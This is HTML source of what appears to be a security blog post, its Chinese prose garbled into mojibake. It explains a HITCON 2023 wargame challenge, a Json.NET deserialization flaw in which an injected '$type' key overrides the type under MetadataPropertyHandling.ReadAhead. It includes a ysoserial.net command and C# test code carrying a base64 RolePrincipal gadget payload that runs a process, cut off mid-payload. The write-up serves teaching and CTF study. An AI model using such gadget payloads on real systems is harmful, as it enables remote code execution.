&lt;p&gt;æœ€å¾Œä¸€å€‹é¡Œç›®ä¹Ÿæ˜¯æœ¬ç¯‡æ–‡ç« æƒ³è¦å’Œå¤§å®¶åˆ†äº«çš„ä¸»é¡Œï¼šMy todolistã€‚å¾çµè«–è€Œè¨€ï¼Œé€™æ˜¯ä¸€å€‹ç°¡å–®çš„ Json.NET ååºåˆ—åŒ–æ¼æ´çš„ç™½ç®±é¡Œç›®ï¼Œå­˜åœ¨æ¼æ´çš„ä½ç½®æ˜¯åœ¨ç¨‹å¼ç¢¼ &lt;a href=&quot;https://github.com/DEVCORE-Wargame/HITCON-2023/blob/main/challenges/web/My%20todolist/MyTodolist/MyTodolist/Extensions/WebExtension.cs#L20&quot;&gt;Extensions/WebExtension.cs&lt;/a&gt; çš„ç¬¬ 20 è¡Œï¼Œä½†æˆ‘æƒ³ç¨å¾®å’Œå¤§å®¶åˆ†äº«é¡Œç›®çš„ç”±ä¾†ã€‚&lt;/p&gt;

&lt;p&gt;é¡Œç›®èµ·æºæ–¼æˆ‘æ›¾ç¶“åœ¨æŸäº›ç¨‹å¼ä¸­çœ‹éé¡ä¼¼ä»¥ä¸‹çš„ Deep Copy å¯¦ä½œï¼š&lt;/p&gt;
&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;T&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Clone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;T&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JsonSerializerSettings&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JsonSerializerSettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;All&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DeserializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SerializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æˆ‘å€‘éƒ½çŸ¥é“ç•¶ DeserializeObject çš„ä¾†æºå­—ä¸²å¯ä»¥æ§åˆ¶ä¸¦ä¸”é–‹å•Ÿ TypeNameHandling æ™‚ï¼Œæˆ‘å€‘å¯ä»¥è¼•æ˜“åˆ©ç”¨ååºåˆ—åŒ–èƒ½åˆå§‹åŒ–ä»»æ„ç‰©ä»¶çš„ç‰¹æ€§åŸ·è¡Œä»»æ„ç¨‹å¼ç¢¼æˆ–ç³»çµ±æŒ‡ä»¤ï¼Œç„¶è€Œåœ¨ Deep Clone çš„ä½¿ç”¨æƒ…å¢ƒä¸‹ï¼Œä¾†æºå­—ä¸²æ˜¯ SerializeObject çš„è¼¸å‡ºçµæœï¼Œé€™ä»£è¡¨è‘—ä»»ä½•æ¨™è¨˜ç‰©ä»¶åç¨±çš„ $type å±¬æ€§ä¹Ÿæ˜¯ç”± Json.NET æ‰€æ§åˆ¶è€Œéç”±æˆ‘å€‘æ§åˆ¶ï¼Œæ‰€ä»¥é€™è¡¨ç¤ºé€™æ®µç¨‹å¼ç¢¼æ‡‰è©²æ˜¯ç„¡æ³•è¢«åˆ©ç”¨çš„æ‰å°ï¼Œé™¤éï¼Œè‹¥æˆ‘å€‘å¯ä»¥è¦†è“‹ $type å±¬æ€§çš„è©±å‘¢ï¼Ÿ&lt;/p&gt;

&lt;p&gt;é€™å€‹ç–‘å•å‹¾èµ·äº†æˆ‘çš„å¥½å¥‡å¿ƒï¼Œå› æ­¤è®“æˆ‘æ±ºå®šé€²è¡Œä¸€äº›å˜—è©¦ï¼Œç•¶æˆ‘å˜—è©¦ç”¨ä»¥ä¸‹ç¨‹å¼ç¢¼åºåˆ—åŒ–ä¸€å€‹ Dictionary ç‰©ä»¶æ™‚ï¼Œæˆ‘å¾—åˆ°äº†ä¸€å€‹æœ‰è¶£çš„çµæœã€‚&lt;/p&gt;
&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;value&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;JsonSerializerSettings&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JsonSerializerSettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;All&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SerializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;çµæœï¼š&lt;/p&gt;
&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;$type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.String, mscorlib]], mscorlib&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;value&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç•¶æˆ‘å€‘åºåˆ—åŒ– Dictionary æ™‚ï¼Œæˆ‘å€‘æ‰€æ’å…¥çš„ä»»ä½• key å’Œ value çš„ pair éƒ½å’Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$type&lt;/code&gt; å±¬æ€§å€¼åœ¨åŒä¸€å€‹å±¤ç´šï¼Œé‚£å‡è¨­æˆ‘å€‘ Dictionary å…§å«æœ‰å€¼ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$type&lt;/code&gt; çš„ key æ™‚ï¼Œæœƒç™¼ç”Ÿä»€éº¼äº‹æƒ…ï¼Ÿ&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;$type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;JsonSerializerSettings&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JsonSerializerSettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;All&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DeserializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SerializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æœƒå¾—åˆ°ä¸€å€‹ä¾‹å¤–éŒ¯èª¤ï¼š&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Newtonsoft.Json.JsonSerializationException: â€˜Type specified in JSON â€˜System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aâ€™ is not compatible with â€˜System.Collections.Generic.Dictionary`2[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089â€™. Path â€˜$typeâ€™, line 1, position 236.â€™&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;è‹¥å»ºç«‹ debug æ–·é»å°‡ JsonConvert.SerializeObject çš„çµæœå­—ä¸²å°å‡ºä¾†æœƒå¾—åˆ°ï¼š&lt;/p&gt;
&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;$type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.String, mscorlib]], mscorlib&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;$type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å…¶å¯¦å¾é€™æ®µéŒ¯èª¤è¨Šæ¯å°±å¯ä»¥çŒœæ¸¬å‡ºå¤§è‡´å‡ºéŒ¯çš„å¯èƒ½æ€§ï¼Œå¦‚æœå†ç¨å¾®è¿½å…¥ç¨‹å¼ç¢¼å°±æœƒç™¼ç¾ï¼Œæˆ‘å€‘è¨­å®šçš„ç¬¬äºŒå€‹ $type ç¢ºå¯¦æˆåŠŸè®“ Json.NET å˜—è©¦å»è¦†è“‹ç¬¬ä¸€å€‹ $type æŒ‡å®šçš„ç‰©ä»¶é¡å‹ï¼Œä½† Json.NET åœ¨é€™æ®µçš„è™•ç†æœƒæª¢æŸ¥ç¬¬äºŒå€‹ç‰©ä»¶é¡å‹æ˜¯å¦èƒ½å¤ ç›¸å®¹æ–¼ç¬¬ä¸€å€‹ç‰©ä»¶é¡å‹ï¼Œä¹Ÿå°±æ˜¯æª¢æŸ¥æ˜¯å¦ assignableï¼Œè‹¥æˆ‘å€‘èƒ½æ‰¾åˆ°æŸå€‹é¡ Dictionary ç‰©ä»¶å¯ä»¥æˆç‚º gadget çš„è©±ï¼Œé€™æ®µç¨‹å¼ç¢¼ä¹Ÿè¨±å°‡æˆç‚º exploitableã€‚&lt;/p&gt;

&lt;p&gt;ä½†è¦æŒ–æ˜æ–°çš„ gadget ååˆ†å›°é›£ï¼Œè€Œä¸”å°±ç®—æ‰¾åˆ°äº†ï¼Œè¦ä½œç‚º Wargame é¡Œç›®ä¹Ÿå¯èƒ½éæ–¼åˆé›£ï¼Œæ‰€ä»¥æˆ‘é€™é‚Šæ‰¾åˆ°äº†ä¸€ç¨®è®Šç¨®æƒ…å¢ƒï¼Œé›–ç„¶æ˜¯ä¸å¸¸è¦‹çš„è¨­å®šï¼Œä½†æˆ‘è¦ºå¾—ä½œç‚ºä¸€é“é¡Œç›®æƒ…å¢ƒçš„è©±æœƒéå¸¸æœ‰è¶£ã€‚&lt;/p&gt;

&lt;p&gt;é€™å€‹é¡Œç›®æƒ…å¢ƒçš„é—œéµæ˜¯ &lt;a href=&quot;https://www.newtonsoft.com/json/help/html/deserializemetadatapropertyhandling.htm&quot;&gt;MetadataPropertyHandling.ReadAhead&lt;/a&gt; é€™å€‹è¨­å®šå€¼ï¼Œç•¶æä¾›çµ¦ JsonConvert.DeserializeObject çš„ JsonSerializerSettings ä¸­æœ‰åŒ…å« MetadataPropertyHandling.ReadAhead æ™‚ï¼Œå®ƒæœƒå‡è¨­ $type ä¸æ˜¯åœ¨ç¬¬ä¸€å€‹å±¬æ€§å€¼çš„ä½ç½®ï¼Œé€™æœƒå°è‡´ Json.NET å…ˆå˜—è©¦å¾é ­åˆ°å°¾æŠŠ JSON è§£æå®Œä¸¦æ‰¾å‡º $type å¾Œæ‰é–‹å§‹å»ºç«‹ç‰©ä»¶ï¼Œåœ¨æ­¤æƒ…å¢ƒä¸‹ä¹Ÿæœƒè®“æˆ‘å€‘æ³¨å…¥çš„ç¬¬äºŒå€‹ $type ç›´æ¥è¦†è“‹ç¬¬ä¸€å€‹ $type çš„å€¼ï¼Œæ‰€ä»¥å‡å¦‚ç¨‹å¼ç¢¼æ”¹å¯«ç‚ºå¦‚ä¸‹çš„ç¨‹å¼ç¢¼æ™‚ï¼Œé€™å€‹ Clone function å°‡æœƒè®Šå¾— exploitableã€‚&lt;/p&gt;
&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;you control the key&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;you control the value&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;JsonSerializerSettings&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JsonSerializerSettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;MetadataPropertyHandling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MetadataPropertyHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadAhead&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DeserializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SerializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æˆ‘å€‘å¯ä»¥ä¾†å¯¦éš›åˆ©ç”¨ä¸€å€‹ gadget é€²è¡Œ code execution æ¸¬è©¦ï¼Œé€™é‚Šæˆ‘ä½¿ç”¨ ysoserial.net ç”¢ç”Ÿ RolePrincipal gadget çš„ payload ( &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ysoserial.exe -g RolePrincipal -f Json.Net -c calc&lt;/code&gt; )ï¼Œå› ç‚ºé€™å€‹ gadget åªéœ€è¦æ§åˆ¶ JSON ä¸€å±¤çš„å­—ä¸²å°±å¯ä»¥åŸ·è¡ŒæŒ‡ä»¤ï¼Œé¡Œç›®æƒ…å¢ƒç›¸å°å®¹æ˜“å»ºæ§‹ã€‚&lt;/p&gt;

&lt;p&gt;æ¸¬è©¦åŸ·è¡Œï¼š&lt;/p&gt;
&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;$type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;System.Security.ClaimsPrincipal.Identities&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAswU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8y